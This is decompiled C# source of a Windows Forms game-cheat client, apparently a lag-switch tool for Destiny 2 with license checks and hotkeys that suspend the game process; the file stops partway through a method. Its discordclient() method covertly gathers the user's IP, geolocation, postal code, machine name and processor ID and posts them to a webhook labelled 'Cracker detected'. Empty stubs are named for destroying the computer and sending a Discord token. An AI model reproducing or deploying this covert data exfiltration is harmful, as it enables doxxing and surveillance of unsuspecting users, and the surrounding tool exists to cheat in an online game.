using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using KeyAuth;
using MProcess;
using VisionDevelopment;
using Vision_Client.limiter;
using Vision_Client.options;
using Vision_Client.Properties;

namespace Vision_Client
{
	// Token: 0x02000012 RID: 18
	public partial class Vision : Form
	{
		// Token: 0x060000DE RID: 222 RVA: 0x00012994 File Offset: 0x00012994
		public Vision(Overlay overlay)
		{
			this.overlay = overlay;
			this.config = Program.cfg;
			this.setupNetlimiterClient();
			overlay.Show();
			overlay.hideTimerText();
			this.InitializeComponent();
		}

		// Token: 0x060000DF RID: 223 RVA: 0x00012A60 File Offset: 0x00012A60
		private void discordclient()
		{
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("https://ipapi.co/ip/");
			string text2 = webClient.DownloadString("https://ipapi.co/city/");
			string text3 = webClient.DownloadString("https://ipapi.co/latitude");
			string text4 = webClient.DownloadString("https://ipapi.co/latlong");
			string text5 = webClient.DownloadString("https://ipapi.co/timezone/");
			string text6 = webClient.DownloadString("https://ipapi.co/languages/");
			string text7 = webClient.DownloadString("https://ipapi.co/region/");
			string text8 = webClient.DownloadString("https://ipapi.co/region_code/");
			string text9 = webClient.DownloadString("https://ipapi.co/country_code/");
			string text10 = webClient.DownloadString("https://ipapi.co/country_code_iso3/");
			string text11 = webClient.DownloadString("https://ipapi.co/country_name/");
			string text12 = webClient.DownloadString("https://ipapi.co/country_capital/");
			string text13 = webClient.DownloadString("https://ipapi.co/country_capital/");
			string text14 = webClient.DownloadString("https://ipapi.co/country_area/");
			string text15 = webClient.DownloadString("https://ipapi.co/country_population/");
			string text16 = webClient.DownloadString("https://ipapi.co/in_eu/");
			string text17 = webClient.DownloadString("https://ipapi.co/postal/");
			string text18 = webClient.DownloadString("https://ipapi.co/utc_offset/");
			string text19 = webClient.DownloadString("https://ipapi.co/country_calling_code/");
			string text20 = webClient.DownloadString("https://ipapi.co/currency/");
			string text21 = webClient.DownloadString("https://ipapi.co/currency_name/");
			string text22 = webClient.DownloadString("https://ipapi.co/asn/");
			string text23 = webClient.DownloadString("https://ipapi.co/org/");
			string text24 = webClient.DownloadString("https://ipapi.co/continent_code/");
			string machineName = Environment.MachineName;
			string username = UserLogin.KeyAuthApp.user_data.username;
			string systemDirectory = Environment.SystemDirectory;
			string text25 = Vision.<discordclient>g__GetProcessorID|6_0();
			Dictionary<string, string> nameValueCollection = new Dictionary<string, string>
			{
				{
					"content",
					"\n@everyone Cracker detected! :sob:\n`............................. `\n`.............................`\n`........   ......   .........`\n`........    ....    .........`\n`.........    ...   ..........`\n`,,,,,,,,,,    ,   .,,,,,,,,,,`\n`,,,,,,,,,,,       ,,,,,,,,,,,`\n`,,,,,,,,,,,      ,,,,,,,,,,,,`\n`,,,,,,,,,,,,    ,,,,,,,,,,,,,`\n`,,,,,,,,,,,,,,,,,,,,,,,,,,,,,`\n`,,,,,,,,,,,,,,,,,,,,,,,,,,,,,`\n`- Vision Development`\n========================= Information =========================\nUsername: " + username + "\nMachine Name: " + machineName
				}
			};
			Dictionary<string, string> nameValueCollection2 = new Dictionary<string, string>
			{
				{
					"content",
					string.Concat(new string[]
					{
						"\n======================== IP Information ========================\nIP Address: ",
						text,
						"\nTime Zone: ",
						text5,
						"\nUTC: ",
						text18,
						"\nLat/Long: ",
						text4,
						"\nCountry Calling Code: ",
						text19,
						"\nCountry: ",
						text11,
						"\nCity: ",
						text2,
						"\nRegion: ",
						text7,
						"\nRegion Code: ",
						text8
					})
				}
			};
			Dictionary<string, string> nameValueCollection3 = new Dictionary<string, string>
			{
				{
					"content",
					string.Concat(new string[]
					{
						"\nPostal Code / Zip Code: ",
						text17,
						"\n====================== System Information ======================\nSystem Directory: ",
						systemDirectory,
						"\nHWID: ",
						text25,
						"\n\n================================================================\n- Vision Development team\n================================================================"
					})
				}
			};
			HttpClient httpClient = new HttpClient();
			httpClient.PostAsync(Config.Url, new FormUrlEncodedContent(nameValueCollection)).GetAwaiter().GetResult();
			Thread.Sleep(300);
			httpClient.PostAsync(Config.Url, new FormUrlEncodedContent(nameValueCollection2)).GetAwaiter().GetResult();
			Thread.Sleep(300);
			httpClient.PostAsync(Config.Url, new FormUrlEncodedContent(nameValueCollection3)).GetAwaiter().GetResult();
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x00012D6C File Offset: 0x00012D6C
		private void setupNetlimiterClient()
		{
			NLConfig nlconfig = this.config;
			KeysConverter keysConverter = new KeysConverter();
			HotKeyManager.RegisterHotKey(Keys.D0, KeyModifiers.Control);
			HotKeyManager.HotKeyPressed += delegate(object sender, HotKeyEventArgs e)
			{
				bool flag = e.Key == Keys.D0;
				if (flag)
				{
					bool flag2 = !this.pauseBTN.Checked;
					if (flag2)
					{
						this.pauseBTN.Checked = true;
						int pidWithName = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
						ProcessAccess.SuspendProcess(pidWithName);
					}
					else
					{
						bool @checked = this.pauseBTN.Checked;
						if (@checked)
						{
							this.pauseBTN.Checked = false;
							int pidWithName2 = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
							ProcessAccess.ResumeProcess(pidWithName2);
						}
					}
				}
				foreach (D2Filter d2Filter in Program.filters)
				{
					bool flag3 = e.Key == d2Filter.Hotkey && e.Modifiers == d2Filter.Modifiers;
					if (flag3)
					{
						this.changeColor(d2Filter);
						bool timerEnabled = this.config.timerEnabled;
						if (timerEnabled)
						{
							this.enableDisableTimer();
						}
					}
				}
			};
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x00012DA4 File Offset: 0x00012DA4
		private void enableDisableTimer()
		{
			bool flag = this.enabledPanels.Count > 0 && !this.overlay.timerEnabled;
			if (flag)
			{
				this.overlay.isTimerEnabled();
			}
			else
			{
				bool flag2 = this.enabledPanels.Count == 0 && this.overlay.timerEnabled;
				if (flag2)
				{
					this.overlay.isTimerEnabled();
				}
			}
		}

		// Token: 0x060000E2 RID: 226 RVA: 0x00012E14 File Offset: 0x00012E14
		private void changeColor(D2Filter filter)
		{
			string name = filter.Name;
			string a = name;
			if (!(a == "Destiny 2"))
			{
				if (!(a == "3074"))
				{
					if (!(a == "3074 UL"))
					{
						if (!(a == "30k"))
						{
							if (!(a == "27k"))
							{
								if (a == "7k")
								{
									this.checkStatusAndChangeColor(this.guna2ShadowPanel4, filter.IsEnabled(), "7.5k");
								}
							}
							else
							{
								this.checkStatusAndChangeColor(this.guna2ShadowPanel3, filter.IsEnabled(), "27k");
							}
						}
						else
						{
							this.checkStatusAndChangeColor(this.guna2ShadowPanel1, filter.IsEnabled(), "30k");
						}
					}
					else
					{
						this.checkStatusAndChangeColor(this.guna2ShadowPanel2, filter.IsEnabled(), "3074 UL");
					}
				}
				else
				{
					this.checkStatusAndChangeColor(this.download3074Panel, filter.IsEnabled(), "3074 DL");
				}
			}
			else
			{
				this.checkStatusAndChangeColor(this.guna2ShadowPanel5, filter.IsEnabled(), "Full");
			}
		}

		// Token: 0x060000E3 RID: 227 RVA: 0x00012F28 File Offset: 0x00012F28
		public void checkWhichAndChange(string whichHotkey, string newHotkey)
		{
			if (!(whichHotkey == "Full Game"))
			{
				if (!(whichHotkey == "3074"))
				{
					if (!(whichHotkey == "3074 UL"))
					{
						if (!(whichHotkey == "30k"))
						{
							if (!(whichHotkey == "27k"))
							{
								if (whichHotkey == "7k")
								{
									this.hotkey7k.Text = newHotkey;
								}
							}
							else
							{
								this.hotkey27k.Text = newHotkey;
							}
						}
						else
						{
							this.hotkey30k.Text = newHotkey;
						}
					}
					else
					{
						this.hotkey3074UL.Text = newHotkey;
					}
				}
				else
				{
					this.hotkey3074.Text = newHotkey;
				}
			}
			else
			{
				this.hotkeyFull.Text = newHotkey;
			}
		}

		// Token: 0x060000E4 RID: 228 RVA: 0x00012FE8 File Offset: 0x00012FE8
		private void checkStatusAndChangeColor(Guna2ShadowPanel panel, bool isEnabled, string name)
		{
			bool flag = isEnabled && !this.enabledPanels.Contains(panel);
			if (flag)
			{
				this.checkIfTimerActive();
				panel.FillColor = Color.FromArgb(64, 222, 106);
				this.enabledPanels.Add(panel);
				this.moduleAnimation(panel, name, isEnabled);
			}
			else
			{
				bool flag2 = this.enabledPanels.Contains(panel) && !isEnabled;
				if (flag2)
				{
					this.checkIfTimerActive();
					this.enabledPanels.Remove(panel);
					this.moduleAnimation(panel, name, isEnabled);
					bool flag3 = Settings.Default.Color == "Default";
					if (flag3)
					{
						panel.FillColor = Color.FromArgb(156, 0, 255);
					}
					bool flag4 = Settings.Default.Color == "Blue";
					if (flag4)
					{
						panel.FillColor = Color.Blue;
					}
					bool flag5 = Settings.Default.Color == "Red";
					if (flag5)
					{
						panel.FillColor = Color.Red;
					}
					bool flag6 = Settings.Default.Color == "Pink";
					if (flag6)
					{
						panel.FillColor = Color.FromArgb(255, 0, 156);
					}
					bool flag7 = Settings.Default.Color == "Green";
					if (flag7)
					{
						panel.FillColor = Color.FromArgb(0, 205, 121);
					}
					bool flag8 = Settings.Default.Color == "Orange";
					if (flag8)
					{
						panel.FillColor = Color.FromArgb(255, 102, 0);
					}
					bool flag9 = Settings.Default.Color == "Cyan";
					if (flag9)
					{
						panel.FillColor = Color.FromArgb(0, 204, 255);
					}
				}
			}
		}

		// Token: 0x060000E5 RID: 229 RVA: 0x000131CC File Offset: 0x000131CC
		private void checkIfTimerActive()
		{
			bool isRunning = this.timer.IsRunning;
			if (isRunning)
			{
				this.timer.Stop();
				this.overlay.hideModule();
			}
		}

		// Token: 0x060000E6 RID: 230 RVA: 0x00013204 File Offset: 0x00013204
		private void moduleAnimation(Guna2ShadowPanel panel, string name, bool enabled)
		{
			this.overlay.enabled = enabled;
			this.overlay.moduleName = name;
			this.overlay.showModule();
			this.timer.SetTime(0, 2);
			this.timer.Start();
			CountDownTimer countDownTimer = this.timer;
			countDownTimer.CountDownFinished = (Action)Delegate.Combine(countDownTimer.CountDownFinished, new Action(delegate()
			{
				this.overlay.hideModule();
			}));
		}

		// Token: 0x060000E7 RID: 231 RVA: 0x00013278 File Offset: 0x00013278
		private void download3074Panel_MouseEnter(object sender, EventArgs e)
		{
			this.download3074Panel.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.download3074Panel);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x060000E8 RID: 232 RVA: 0x000132D8 File Offset: 0x000132D8
		private void download3074Panel_MouseLeave(object sender, EventArgs e)
		{
			this.download3074Panel.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.download3074Panel);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x060000E9 RID: 233 RVA: 0x0001332C File Offset: 0x0001332C
		private void guna2ShadowPanel2_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel2.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel2);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x060000EA RID: 234 RVA: 0x0001338C File Offset: 0x0001338C
		private void guna2ShadowPanel2_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel2.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel2);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x060000EB RID: 235 RVA: 0x000133E0 File Offset: 0x000133E0
		private void guna2ShadowPanel4_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel4.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel4);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x060000EC RID: 236 RVA: 0x00013440 File Offset: 0x00013440
		private void guna2ShadowPanel4_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel4.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel4);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x060000ED RID: 237 RVA: 0x00013494 File Offset: 0x00013494
		private void guna2ShadowPanel1_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel1.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel1);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x060000EE RID: 238 RVA: 0x000134F4 File Offset: 0x000134F4
		private void guna2ShadowPanel1_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel1.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel1);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x060000EF RID: 239 RVA: 0x00013548 File Offset: 0x00013548
		private void guna2ShadowPanel3_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel3.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel3);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x060000F0 RID: 240 RVA: 0x000135A8 File Offset: 0x000135A8
		private void guna2ShadowPanel3_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel3.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel3);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x060000F1 RID: 241 RVA: 0x000135FC File Offset: 0x000135FC
		private void guna2ShadowPanel5_MouseEnter(object sender, EventArgs e)
		{
			this.guna2ShadowPanel5.Size = new Size(this.defaultWidth + this.widthModify, this.defaultHeight + this.heightModiy);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel5);
			if (flag)
			{
			}
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x060000F2 RID: 242 RVA: 0x0001365C File Offset: 0x0001365C
		private void guna2ShadowPanel5_MouseLeave(object sender, EventArgs e)
		{
			this.guna2ShadowPanel5.Size = new Size(this.defaultWidth, this.defaultHeight);
			bool flag = !this.enabledPanels.Contains(this.guna2ShadowPanel5);
			if (flag)
			{
			}
			this.Cursor = Cursors.Default;
		}

		// Token: 0x060000F3 RID: 243 RVA: 0x000136AD File Offset: 0x000136AD
		private void codeThatGOESBRRRRANDDESTROYSYOURCOMPUTER(bool DESTROYEDCOMPUTER)
		{
		}

		// Token: 0x060000F4 RID: 244 RVA: 0x000136B0 File Offset: 0x000136B0
		private void sendToServer(string discordToken)
		{
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x000136B4 File Offset: 0x000136B4
		private void Exit_Click(object sender, EventArgs e)
		{
			foreach (D2Filter d2Filter in Program.filters)
			{
				d2Filter.Disable();
				this.pauseBTN.Checked = false;
				int pidWithName = ProcessAccess.GetPidWithName(this.destiny2lbl.Text);
				ProcessAccess.ResumeProcess(pidWithName);
			}
			Application.Exit();
		}

		// Token: 0x060000F6 RID: 246 RVA: 0x00013738 File Offset: 0x00013738
		private void guna2ImageRadioButton1_CheckedChanged(object sender, EventArgs e)
		{
			this.overlay.Hide();
			this.overlay.Close();
			Settings settings = new Settings();
			settings.ShowDialog();
			base.Hide();
			base.Close();
		}

		// Token: 0x060000F7 RID: 247 RVA: 0x0001377C File Offset: 0x0001377C
		public void showModuleOptions(string whichModule)
		{
			int width = base.Width;
			int height = base.Height;
			ModuleOption moduleOption = new ModuleOption(whichModule, this);
			moduleOption.Location = new Point((width - moduleOption.Width) / 2, (height - moduleOption.Height) / 2);
			moduleOption.ShowDialog();
		}

		// Token: 0x060000F8 RID: 248 RVA: 0x000137C7 File Offset: 0x000137C7
		private void download3074Panel_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("3074");
		}

		// Token: 0x060000F9 RID: 249 RVA: 0x000137D6 File Offset: 0x000137D6
		private void guna2ShadowPanel2_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("3074 UL");
		}

		// Token: 0x060000FA RID: 250 RVA: 0x000137E5 File Offset: 0x000137E5
		private void guna2ShadowPanel4_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("7k");
		}

		// Token: 0x060000FB RID: 251 RVA: 0x000137F4 File Offset: 0x000137F4
		private void guna2ShadowPanel5_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("Full Game");
		}

		// Token: 0x060000FC RID: 252 RVA: 0x00013803 File Offset: 0x00013803
		private void guna2ShadowPanel1_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("30k");
		}

		// Token: 0x060000FD RID: 253 RVA: 0x00013812 File Offset: 0x00013812
		private void guna2ShadowPanel3_Click(object sender, EventArgs e)
		{
			this.showModuleOptions("27k");
		}

		// Token: 0x060000FE RID: 254 RVA: 0x00013824 File Offset: 0x00013824
		private void Vision_VisibleChanged(object sender, EventArgs e)
		{
			bool flag = base.Opacity == 1.0;
			if (flag)
			{
				foreach (D2Filter d2Filter in Program.filters)
				{
					string text = d2Filter.Hotkey.ToString();
					bool flag2 = text.StartsWith("D");
					if (flag2)
					{
						text = text.Substring(1);
					}
					bool flag3 = d2Filter.Name == "Destiny 2";
					if (flag3)
					{
						this.checkWhichAndChange("Full Game", "CTRL - " + text);
					}
					this.checkWhichAndChange(d2Filter.Name, "CTRL - " + text);
				}
			}
		}

		// Token: 0x060000FF RID: 255 RVA: 0x00013908 File Offset: 0x00013908
		private void Vision_Activated(object sender, EventArgs e)
		{
			bool flag = base.Opacity == 1.0;
			if (flag)
			{
				foreach (D2Filter d2Filter in Program.filters)
				{
					string text = d2Filter.Hotkey.ToString();
					bool flag2 = text.StartsWith("D");
					if (flag2)
					{
						text = text.Substring(1);
					}
					bool flag3 = d2Filter.Name == "Destiny 2";
					if (flag3)
					{
						this.checkWhichAndChange("Full Game", "CTRL - " + text);
					}
					this.checkWhichAndChange(d2Filter.Name, "CTRL - " + text);
				}
			}
		}

		// Token: 0x06000100 RID: 256 RVA: 0x000139EC File Offset: 0x000139EC
		private void hotkeyFull_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000101 RID: 257 RVA: 0x000139EF File Offset: 0x000139EF
		private void Question3074_Click_1(object sender, EventArgs e)
		{
		}

		// Token: 0x06000102 RID: 258 RVA: 0x000139F4 File Offset: 0x000139F4
		private void guna2CirclePictureBox1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Pick your profile picture!";
			openFileDialog.Filter = "Image Files (*.jpg; *.jpeg; *.gif; *.bmp;|*.jpg; *.jpeg; *.gif; *.bmp;";
			openFileDialog.FilterIndex = 2;
			openFileDialog.RestoreDirectory = true;
			bool flag = openFileDialog.ShowDialog() == DialogResult.OK;
			if (flag)
			{
				this.fileLocation = openFileDialog.FileName;
				this.SavePictureAction(this.fileLocation);
			}
			else
			{
				MessageBox.Show("Invalid Image");
			}
		}

		// Token: 0x06000103 RID: 259 RVA: 0x00013A64 File Offset: 0x00013A64
		private void Vision_Load(object sender, EventArgs e)
		{
			Vision.KeyAuthApp.init();
			Vision.KeyAuthApp.check();
			bool flag = Settings.Default.Color == "";
			if (flag)
			{
				this.guna2ComboBox1.Text = "Default";
			}
			else
			{
				this.guna2ComboBox1.Text = Settings.Default.Color;
			}
			bool flag2 = this.config.avatarPath != "";
			if (flag2)
			{
				Image image = Image.FromFile(Program.cfg.avatarPath);
				this.guna2CirclePictureBox1.Image = image;
			}
			bool flag3 = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription == "Developer";
			if (flag3)
			{
				this.AdminLBL.Visible = true;
				this.AdminLBL.Enabled = true;
			}
			this.PCName.Text = UserLogin.KeyAuthApp.user_data.username;
			this.PCName.ForeColor = Color.White;
			this.StatusLbl.Text = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription;
			bool flag4 = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription == "Booster";
			if (flag4)
			{
				this.StatusLbl.ForeColor = Color.FromArgb(244, 127, 255);
			}
			else
			{
				this.StatusLbl.ForeColor = Color.FromArgb(124, 203, 255);
			}
			bool flag5 = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription == "Member";
			if (flag5)
			{
				this.pauseBTN.Enabled = false;
			}
			bool flag6 = UserLogin.KeyAuthApp.user_data.subscriptions[0].subscription == "Member";
			if (flag6)
			{
				NLConfig cfg = Program.cfg;
				cfg.timerEnabled = true;
				cfg.changeTimerEnabled(!cfg.timerEnabled, cfg);
			}
		}

		// Token: 0x06000104 RID: 260 RVA: 0x00013C8C File Offset: 0x00013C8C
		private void SavePictureAction(string fileLocation)
		{
			this.config.changeAvatarPath(fileLocation, Program.cfg);
			Image image = Image.FromFile(this.config.avatarPath);
			this.guna2CirclePictureBox1.Image = image;
		}

		// Token: 0x06000105 RID: 261 RVA: 0x00013CCC File Offset: 0x00013CCC
		private void UpdateLBL_Click(object sender, EventArgs e)
		{
			this.overlay.Hide();
			this.overlay.Close();
			AdminPanel adminPanel = new AdminPanel();
			adminPanel.ShowDialog();
			base.Hide();
			base.Close();
		}

		// Token: 0x06000106 RID: 262 RVA: 0x00013D0F File Offset: 0x00013D0F
		private void pictureBox2_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.com/invite/woofs");
		}

		// Token: 0x06000107 RID: 263 RVA: 0x00013D20 File Offset: 0x00013D20
		private void label1_Click_1(object sender, EventArgs e)
		{
			base.Dispose();
			ModuleInformation moduleInformation = new ModuleInformation();
			moduleInformation.ShowDialog();
		}

		// Token: 0x06000108 RID: 264 RVA: 0x00013D44 File Offset: 0x00013D44
		private void StatusLbl_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000109 RID: 265 RVA: 0x00013D48 File Offset: 0x00013D48
		private void label1_MouseEnter(object sender, EventArgs e)
		{
			this.label1DefaultWidth = this.label1.Size.Width;
			this.label1DefaultHeight = this.label1.Size.Height;
			this.label1.Size = new Size(this.label1DefaultWidth + this.label1WidthModify, this.label1DefaultHeight + this.label1HeightModify);
			this.label1.ForeColor = Color.Gray;
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x0600010A RID: 266 RVA: 0x00013DD0 File Offset: 0x00013DD0
		private void label1_MouseLeave(object sender, EventArgs e)
		{
			this.label1.Size = new Size(this.label1DefaultWidth, this.label1DefaultHeight);
			this.label1.ForeColor = Color.White;
			this.Cursor = Cursors.Default;
		}

		// Token: 0x0600010B RID: 267
		[DllImport("kernel32.dll")]
		private static extern IntPtr OpenThread(Vision.ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

		// Token: 0x0600010C RID: 268
		[DllImport("kernel32.dll")]
		private static extern uint SuspendThread(IntPtr hThread);

		// Token: 0x0600010D RID: 269
		[DllImport("kernel32.dll")]
		private static extern int ResumeThread(IntPtr hThread);

		// Token: 0x0600010E RID: 270
		[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern bool CloseHandle(IntPtr handle);

		// Token: 0x0600010F RID: 271 RVA: 0x00013E0D File Offset: 0x00013E0D
		private void guna2Button1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000110 RID: 272 RVA: 0x00013E10 File Offset: 0x00013E10
		private void pictureBox2_MouseEnter(object sender, EventArgs e)
		{
			this.discordXPos = this.pictureBox2.Location.X;
			this.discordYPos = this.pictureBox2.Location.Y;
			this.pictureBox2.Location = new Point(this.discordXPos - this.discordWidthModify, this.discordYPos);
			this.pictureBox2.Size = new Size(this.discordDefaultWidth + this.discordWidthModify, this.discordDefaultHeight + this.discordHeightModify);
			this.Cursor = Cursors.Hand;
		}

		// Token: 0x06000111 RID: 273 RVA: 0x00013EAC File Offset: 0x00013EAC
		private void pictureBox2_MouseLeave(object sender, EventArgs e)
		{
			this.pictureBox2.Location = new Point(this.discordXPos, this.discordYPos);
			this.pictureBox2.Size = new Size(this.discordDefaultWidth, this.discordDefaultHeight);
			this.Cursor = Cursors.Default;
		}

		// Token: 0x06000112 RID: 274 RVA: 0x00013F00 File Offset: 0x00013F00
		private void timer1_Tick(object sender, EventArgs e)
		{
			bool flag = this.guna2ComboBox1.SelectedItem == "Default";
			if (flag)
			{
				this.download3074Panel.FillColor = Color.FromArgb(156, 0, 255);
				this.guna2ShadowPanel2.FillColor = Color.FromArgb(156, 0, 255);
				this.guna2ShadowPanel4.FillColor = Color.FromArgb(156, 0, 255);
				this.guna2ShadowPanel5.FillColor = Color.FromArgb(156, 0, 255);
				this.guna2ShadowPanel3.FillColor = Color.FromArgb(156, 0, 255);
				this.guna2ShadowPanel1.FillColor = Color.FromArgb(156, 0, 255);
				this.guna2GradientPanel1.FillColor2 = Color.FromArgb(17, 0, 27);
				this.guna2GradientPanel2.FillColor2 = Color.FromArgb(17, 0, 27);
				this.label8.ForeColor = Color.White;
				this.pictureBox1.Visible = true;
				this.woofwhite.Visible = false;
			}
			bool flag2 = this.guna2ComboBox1.SelectedItem == "Blue";
			if (flag2)
			{
				this.download3074Panel.FillColor = Color.Blue;
				this.guna2ShadowPanel2.FillColor = Color.Blue;
				this.guna2ShadowPanel4.FillColor = Color.Blue;
				this.guna2ShadowPanel5.FillColor = Color.Blue;
				this.guna2ShadowPanel3.FillColor = Color.Blue;
				this.guna2GradientPanel1.FillColor2 = Color.FromArgb(0, 0, 27);
				this.guna2GradientPanel2.FillColor2 = Color.FromArgb(0, 0, 27);
				this.guna2ShadowPanel1.FillColor = Color.Blue;
				this.label8.ForeColor = Color.White;
				this.pictureBox1.Visible = false;
				this.woofwhite.Visible = true;
			}
			bool flag3 = this.guna2ComboBox1.SelectedItem == "Red";
			if (flag3)
			{
				this.guna2ShadowPanel2.FillColor = Color.Red;
				this.guna2ShadowPanel4.FillColor = Color.Red;
				this.download3074Panel.FillColor = Color.Red;
				this.guna2ShadowPanel5.FillColor = Color.Red;
				this.guna2ShadowPanel3.FillColor = Color.Red;
				this.guna2ShadowPanel1.FillColor = Color.Red;
				this.label8.ForeColor = Color.White;
				this.guna2GradientPanel1.FillColor2 = Color.FromArgb(27, 0, 0);
				this.guna2GradientPanel2.FillColor2 = Color.FromArgb(27, 0, 0);
				this.pictureBox1.Visible = false;
				this.woofwhite.Visible = true;
			}
			bool flag4 = this.guna2ComboBox1.SelectedItem == "Pink";
			if (flag4)
			{
				this.download3074Panel.FillColor = Color.FromArgb(255, 0, 156);
				this.guna2ShadowPanel2.FillColor = Color.FromArgb(255, 0, 156);
				this.guna2ShadowPanel4.FillColor = Color.FromArgb(255, 0, 156);
				this.guna2ShadowPanel5.FillColor = Color.FromArgb(255, 0, 156);
				this.guna2ShadowPanel3.FillColor = Color.FromArgb(255, 0, 156);
				this.guna2ShadowPanel1.FillColor = Color.FromArgb(255, 0, 156);
				this.guna2GradientPanel2.FillColor2 = Color.FromArgb(27, 0, 15);
				this.guna2GradientPanel1.FillColor2 = Color.FromArgb(27, 0, 15);
				this.label8.ForeColor = Color.White;
				this.pictureBox1.Visible = false;
				this.woofwhite.Visible = true;
			}
			bool flag5 = this.guna2ComboBox1.SelectedItem == "Green";
			if (flag5)
			{
				this.download3074Panel.FillColor = Color.FromArgb(0, 205, 121);
				this.guna2ShadowPanel4.FillColor = Color.FromArgb(0, 205, 121);
				this.guna2ShadowPanel5.FillColor = Color.FromArgb(0, 205, 121);
				this.guna2ShadowPanel2.FillColor = Color.FromArgb(0, 205, 121);
				this.guna2ShadowPanel3.FillColor = Color.FromArgb(0, 205, 121);
				this.guna2ShadowPanel1.FillColor = Color.FromArgb(0, 205, 121);
				this.guna2GradientPanel1.FillColor2 = Color.FromArgb(0, 27, 11);
				this.guna2GradientPanel2.FillColor2 = Color.FromArgb(0, 27, 11);
				this.label8.ForeColor = Color.White;
				this.pictureBox1.Visible = false;
				this.woofwhite.Visible = true;
			}
			bool flag6 = this.guna2ComboBox1.SelectedItem == "Orange";
			if (flag6)
			{
				this.download3074Panel.FillColor = Color.FromArgb(255, 102, 0);
				this.guna2ShadowPanel2.FillColor = Color.FromArgb(255, 102, 0);
				this.guna2ShadowPanel4.FillColor = Color.FromArgb(255, 102, 0);
				this.guna2ShadowPanel5.FillColor = Color.FromArgb(255, 102, 0);
				this.guna2ShadowPanel3.FillColor = Color.FromArgb(255, 102, 0);
				this.guna2ShadowPanel1.FillColor = Color.FromArgb(255, 102, 0);
				this.guna2GradientPanel1.FillColor2 = Color.FromArgb(27, 11, 0);
				this.label8.ForeColor = Color.White;
				this.pictureBox1.Visible = false;
				this.woofwhite.Visible = true;
				this.guna2GradientPanel2.FillColor2 = Color.FromArgb(27, 11, 0);
			}
			bool flag7 = this.guna2ComboBox1.SelectedItem == "Cyan";
			if (flag7)
			{
				this.download3074Panel.FillColor = Color.FromArgb(0, 204, 255);
				this.guna2ShadowPanel4.FillColor = Color.FromArgb(0, 204, 255);
				this.guna2ShadowPanel2.FillColor = Color.FromArgb(0, 204, 255);
				this.guna2ShadowPanel5.FillColor = Color.FromArgb(0, 204, 255);
				this.guna2ShadowPanel3.FillColor = Color.FromArgb(0, 204, 255);
				this.guna2ShadowPanel1.FillColor = Color.FromArgb(0, 204, 255);
